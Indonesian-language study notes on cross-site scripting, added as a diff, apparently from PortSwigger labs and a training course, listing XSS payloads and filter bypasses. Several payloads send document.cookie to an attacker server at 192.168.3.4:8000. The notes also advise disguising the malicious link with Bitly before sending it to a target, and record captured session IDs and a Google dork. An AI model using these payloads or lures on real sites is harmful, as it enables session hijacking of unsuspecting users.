@@ -1,0 +1,138 @@
+XSS 
+( Cross Site Scripting ) 
+
+
+
+masukkan nama nanti website nya bakal memuntahkan kembali 
+websitenya akan mengembalikan apa yang kita ketik 
+-naufal 
+coba masukkan komponen html 
+-<h1> sesi 1 <h1>
+masukkan java script 
+-<script>alert("xss is dangerous")</script>
+kalau hasilnya pop up warning berarti website ini bisa mengeksekusi JS saat kita memasukan fungsi allert 
+karena ada satu komponen yang ingin didapatkan yaitu cookie 
+cookie adlah sebuah komponen yang dibuat untuk mentracking anda 
+kita bisa curi cookinya dengan xss 
+
+Port swigger 
+<b>video</b>
+membaw kita kehamalan lainnya
+<a href="https://google.com/">click here</a>
+-<script>alert("xss is dangerous")</script>
+https://0a9d00cf043918d1809108cd003e0068.web-security-academy.net/?search=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E
+
+
+DOM XSS 
+
+1. ketik bebas di ujung URL cntoh hahahhahahaha
+2. lalu lihat inspect & back 
+3. javascript:alert(5)
+4. cari di inspect 
+
+Discovering reflected XSS image 
+cara bypass 
+1. "><script>alert("XSS")</script>
+2. "onload=alert(3)> akan menjalankan dan mengeksekusi JS code pada HTML code 
+
+Injection JS in a page script
+1. tesst inspect
+2. cari java script
+           var searchTerms = 'testt';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+Kode bypass
+- ';alert(33);// bypass java script 
+
+Discovering XSS in drop-menu 
+1. modifikasi store ID dengan burpsuite 
+2. &storeId=London = saliin
+3. kita akan menyuntikan kode java scripet disini 
+4. londonnnnn "><script>alert("XSS")</script> suntikan jika muncul pop up berarti rentan 
+
+Bypasing basic filtering 
+1. TEST
+2.   var message = `1 search results for 'TEST'`
+3. '
+cara melewati atau bypass 
+1. ${alert(2220)} ini akan di ekssekusi dan akan dijalankan dalm tks JS dan akan memunculkan POP UP XSS jadi JS ini melihat sebagai kode bukan sebagai string 
+
+Bypasing Advance Filter 
+1. ';alert(33);// payload = jadi mereka bener bener memfilter single code jadi programer bener bener mencoba menutup jalan kita untuk menyuntikan kode JS 
+2. 
+                        var searchTerms = '\';alert(33);//';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+apapun yng kita ketikan setelah str ini 
+
+3. '\';alert(33);//';
+4. \\';alert(33);//'; steelah menambahkan backslash kode kita akan dievaluasi 
+
+Bypassing Advance Filtering 
+1. https://google.com');alert(33)//');
+2. https://google.com&apos;);alert(33)//
+
+
+
+ITBOX 
+
+XSS adalah penyerangan dengan cara memasukan kode HTML atau script lainnya ke situs web korban. serangan ini akan seolah olah datang dari situs tersebut. Akibat serangan ini, penyerang dapat membobol keamanan klien, mendapatkan informasi sensitif, atau menyimpan apklikasi berbahaya. 
+Jenis XSS 
+1. Reflected > data dari penyerang yang dipakai oleh situs web untuk meneksekusi JS dihalaman web berikutnya.
+2. Stored > Data dari penyerang disimpan di situs web untuk kemudian ditampilkan lagi kepada pengguna di kesempatan lain. 
+
+Serangan Cross Site Scripting menyalahgunakan fungsi browser untuk mengirimkan skrip berbahaya ke mesin klien. Dengan kata lain, ini adalah serangan sisi klien. Serangan Cross Site Scripting umumnya dikategorikan ke dalam dua kategori: disimpan dan dipantulkan. Dalam serangan yang dipantulkan, aplikasi mencerminkan kembali skrip berbahaya di browser. Server tidak menyimpan apa pun, melainkan hanya mengirimkan kembali masukan pengguna apa pun, misalnya, pesan kesalahan, hasil pencarian, dll. Serangan semacam itu dilakukan melalui rute berbeda seperti email, obrolan, atau situs web pihak ketiga.
+
+coba masukkan komponen HTML itu bakal ada sanitasi disisi website nya  atau di render oleh 
+1. <h1> sesi 1 <h1>
+JavaScript 
+2. <script>alert("xss is dangerous")</script> = alert itu semacam kayak pop up warning
+	kalo ada pop up warning berarti website ini bisa mengeksekusi JS hasilnya aka mengeluarkan POP UP warning saat kita memasukkan alert 
+Kita bongkar dulu dimana letak cookie yg ada di client 
+3.  <script>alert(document.cookie)</script> 
+Masukan server
+4. python -m http.server 
+bisa memakai JS 
+5.  <script>document.location="http//192.168.3.4:8000" + document.cookie</script> 
+	nanti bakal ada PHPSESSID=ddsicjt697m3n78e3gal0qjrv7
+6.  <script>document.location="http://192.168.3.4:8000" + document.cookie</script> 
+kirimkan dulu linknya ke target nanti di klik linknya 
+7. 192.168.3.53/xvwa/vulnerabilities/reflected_xss/?item=<script>document.location="http://192.168.3.4:8000" + document.cookie</script>
+	BITLY lalu kirimkan 
+
+
+STORED XSS 
+contoh
+masukan name 
+1. naufalll > + comment = bagus sekali
+	ketika di submit isinya bakal ada nama / comment yg anda masukan 
+	jika pergi ke page lain > ini form semua yang kita masukan bakal disimpan di database 
+2. masukkan komponen html <h1> hahaha </h1> nanti akan ke render oleh browser kita sudah dapat indikasi bahwa sudah bisa di injeksi html 	
+	coba kita masukan JS kita coba yang alert dulu kalo berhasil maka akan bisa ksnanya 
+3.  <script>alert("haha")</script>
+	kalo memasukan script yang sprti itu nanti gak bakal ke render karena itu emang browser gak akan mengeluarkan hasil dari JS nya 
+4. anon 
+	 <script>document.write('<img src = http://192.168.3.4:8000? + document.cookie + '/>'):</script> 
+
+
+
+
+cookie 
+PHPSESSID=67nqmf1vsm9mtjhbmukcqsvj40
+	
+
+LINK BITLY taxidriver https://bit.ly/4a3EdPS + cookie 
+		      https://bit.ly/4cr3d56 - tanpa cookie 
+
+
+intitle:"index of" env.cgi
+
+
+
+
+
+
+
+
+
+
+
+
